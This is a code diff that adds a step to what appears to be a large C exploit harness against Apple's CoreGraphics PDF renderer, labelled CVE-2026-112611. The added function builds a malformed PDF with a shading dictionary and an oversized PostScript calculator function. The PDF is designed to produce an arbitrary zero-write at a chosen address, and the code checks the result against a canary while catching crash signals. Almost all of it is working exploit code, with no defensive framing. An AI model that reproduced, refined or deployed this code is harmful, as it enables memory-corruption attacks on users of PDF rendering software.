@@ -31708,6 +31708,155 @@ static void r508_exploit(void) {
     fflush(stdout);
 }
 
+/* r508_7c_only — LEAN Phase 7C canary test only.
+   Runs ONLY the canary zero-write, no earlier phases.
+   Minimises memory/CPU to avoid jetsam kill. */
+static void r508_7c_only(void) {
+    rlog("=== CVE-2026-112611: Phase 7C ONLY (lean canary test) ===\n\n");
+
+    static volatile uint32_t canary = 0xCAFEBABE;
+    uint64_t canary_addr = (uint64_t)(uintptr_t)&canary;
+    uint64_t str_offset = 0x76c;
+    uint64_t x22_target = canary_addr - str_offset;
+
+    rlog("  canary=0x%08x at %p\n", canary, (void *)&canary);
+    rlog("  x22_target=0x%llx (canary_addr 0x%llx - offset 0x%llx)\n",
+        (unsigned long long)x22_target,
+        (unsigned long long)canary_addr,
+        (unsigned long long)str_offset);
+    rlog("  mantissa=%.1f\n", (double)x22_target);
+    fflush(stdout);
+
+    struct sigaction sa_new, sa_old_segv, sa_old_bus;
+    memset(&sa_new, 0, sizeof(sa_new));
+    sa_new.sa_sigaction = r508_sighandler;
+    sa_new.sa_flags = SA_SIGINFO;
+    sigemptyset(&sa_new.sa_mask);
+
+    r508_fault_caught = 0;
+    r508_fault_addr = 0;
+    sigaction(SIGSEGV, &sa_new, &sa_old_segv);
+    sigaction(SIGBUS, &sa_new, &sa_old_bus);
+
+    if (sigsetjmp(r508_jmpbuf, 1) == 0) {
+        int NOUT = 2816;
+        int VPR = 64;
+        int nvert = VPR * 2;
+
+        uint8_t *vstream = (uint8_t *)calloc((size_t)(nvert * 9) + 8, 1);
+        int vo = 0, vb = 0;
+        for (int idx = 0; idx < nvert; idx++) {
+            uint32_t vx = 0x1000 + (uint32_t)(idx % VPR) * 10;
+            uint32_t vy = 0x1000 + (uint32_t)(idx / VPR) * 10;
+            pdf_put_bits(vstream, &vo, &vb, vx, 32);
+            pdf_put_bits(vstream, &vo, &vb, vy, 32);
+            pdf_put_bits(vstream, &vo, &vb, 0, 8);
+        }
+        if (vb > 0) vo++;
+
+        char *fbody = (char *)malloc(128 + (size_t)NOUT * 4);
+        int fbl = snprintf(fbody, 128, "{ pop %.1f 2 -1074 exp mul",
+            (double)x22_target);
+        for (int d = 0; d < NOUT - 1; d++) {
+            memcpy(fbody + fbl, " dup", 4); fbl += 4;
+        }
+        fbody[fbl++] = ' '; fbody[fbl++] = '}'; fbody[fbl] = '\0';
+
+        char *rpairs = (char *)malloc((size_t)NOUT * 4 + 4);
+        int rpl = 0;
+        for (int i = 0; i < NOUT; i++) {
+            if (i > 0) rpairs[rpl++] = ' ';
+            rpairs[rpl++] = '0'; rpairs[rpl++] = ' '; rpairs[rpl++] = '1';
+        }
+        rpairs[rpl] = '\0';
+
+        size_t cap = (size_t)(fbl + rpl + vo + 8192);
+        char *p = (char *)malloc(cap);
+        int pl = 0;
+        pl += snprintf(p+pl, cap-(size_t)pl, "%%PDF-1.7\n%%\xe2\xe3\xcf\xd3\n");
+        int o1=pl; pl += snprintf(p+pl, cap-(size_t)pl,
+            "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n");
+        int o2=pl; pl += snprintf(p+pl, cap-(size_t)pl,
+            "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n");
+        int o3=pl; pl += snprintf(p+pl, cap-(size_t)pl,
+            "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] "
+            "/Resources << /Shading << /Sh1 5 0 R >> >> /Contents 4 0 R >>\nendobj\n");
+        char *content = " /Sh1 sh\n";
+        int o4=pl; pl += snprintf(p+pl, cap-(size_t)pl,
+            "4 0 obj\n<< /Length %d >>\nstream\n%s\nendstream\nendobj\n",
+            (int)strlen(content), content);
+        int o5=pl; pl += snprintf(p+pl, cap-(size_t)pl,
+            "5 0 obj\n<< /ShadingType 5 /ColorSpace /DeviceCMYK "
+            "/BitsPerCoordinate 32 /BitsPerComponent 8 /VerticesPerRow %d "
+            "/Decode [0 200 0 200 0 1] /Function 6 0 R /Length %d >>\nstream\n",
+            VPR, vo);
+        memcpy(p+pl, vstream, (size_t)vo); pl += vo;
+        pl += snprintf(p+pl, cap-(size_t)pl, "\nendstream\nendobj\n");
+        int o6=pl; pl += snprintf(p+pl, cap-(size_t)pl,
+            "6 0 obj\n<< /FunctionType 4 /Domain [0 1] /Range [%s] "
+            "/Length %d >>\nstream\n%s\nendstream\nendobj\n",
+            rpairs, fbl, fbody);
+        int xo=pl; pl += snprintf(p+pl, cap-(size_t)pl,
+            "xref\n0 7\n0000000000 65535 f \n"
+            "%010d 00000 n \n%010d 00000 n \n%010d 00000 n \n"
+            "%010d 00000 n \n%010d 00000 n \n%010d 00000 n \n"
+            "trailer\n<< /Size 7 /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n",
+            o1, o2, o3, o4, o5, o6, xo);
+
+        rlog("  PDF: %d bytes\n", pl);
+        fflush(stdout);
+
+        CFDataRef pd = CFDataCreate(kCFAllocatorDefault, (const UInt8 *)p, (CFIndex)pl);
+        CGDataProviderRef dp = CGDataProviderCreateWithCFData(pd);
+        CGPDFDocumentRef dc = CGPDFDocumentCreateWithProvider(dp);
+        if (dc) {
+            CGPDFPageRef pg = CGPDFDocumentGetPage(dc, 1);
+            if (pg) {
+                CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
+                /* Tiny 2x2 context — just enough to trigger shading eval */
+                uint32_t *px = (uint32_t *)calloc(2 * 2, 4);
+                CGContextRef cx = CGBitmapContextCreate(px, 2, 2, 8, 2*4, cs,
+                    (CGBitmapInfo)kCGImageAlphaPremultipliedLast);
+                rlog("  Rendering (2x2 context)...\n"); fflush(stdout);
+                CGContextDrawPDFPage(cx, pg);
+                rlog("  SURVIVED! canary=0x%08x (was 0xCAFEBABE)\n", canary);
+                if (canary == 0x00000000) {
+                    rlog("  *** CANARY ZEROED! Arbitrary zero-write CONFIRMED! ***\n");
+                } else if (canary != 0xCAFEBABE) {
+                    rlog("  *** CANARY CHANGED to 0x%08x! ***\n", canary);
+                } else {
+                    rlog("  Canary unchanged — str didn't reach canary addr\n");
+                }
+                CGContextRelease(cx); CGColorSpaceRelease(cs); free(px);
+            } else {
+                rlog("  ERROR: CGPDFDocumentGetPage returned NULL\n");
+            }
+            CGPDFDocumentRelease(dc);
+        } else {
+            rlog("  ERROR: CGPDFDocumentCreateWithProvider returned NULL\n");
+        }
+        CGDataProviderRelease(dp); CFRelease(pd);
+        free(p); free(fbody); free(rpairs); free(vstream);
+    } else {
+        rlog("  CRASH: FAR=0x%016llx (canary=0x%08x)\n",
+            (unsigned long long)r508_fault_addr, canary);
+        uint64_t expected = canary_addr;
+        if (r508_fault_addr == expected)
+            rlog("  *** FAR = canary addr — str hit our target! ***\n");
+        else
+            rlog("  expected FAR=0x%016llx, got 0x%016llx (delta=%lld)\n",
+                (unsigned long long)expected,
+                (unsigned long long)r508_fault_addr,
+                (long long)(r508_fault_addr - expected));
+    }
+    sigaction(SIGSEGV, &sa_old_segv, NULL);
+    sigaction(SIGBUS, &sa_old_bus, NULL);
+    fflush(stdout);
+
+    rlog("\n=== r508_7c_only complete ===\n");
+    fflush(stdout);
+}
+
 static void r498_exploit(void) {
     rlog("\n=== r498: Bitstream comparison + PropertyMode ===\n\n");
     fflush(stdout);
@@ -102405,6 +102554,12 @@ new_modes:
             rlog("*** rounds=485: CVE-2026-112477 adapted + SurfHeist + property race ***\n\n");
             fflush(stdout);
             r484_exploit();
+            goto done;
+        }
+        if (rounds == 514) {
+            rlog("*** rounds=514: CVE-2026-112611 Phase 7C ONLY (lean canary) ***\n\n");
+            fflush(stdout);
+            r508_7c_only();
             goto done;
         }
         if (rounds == 513) {
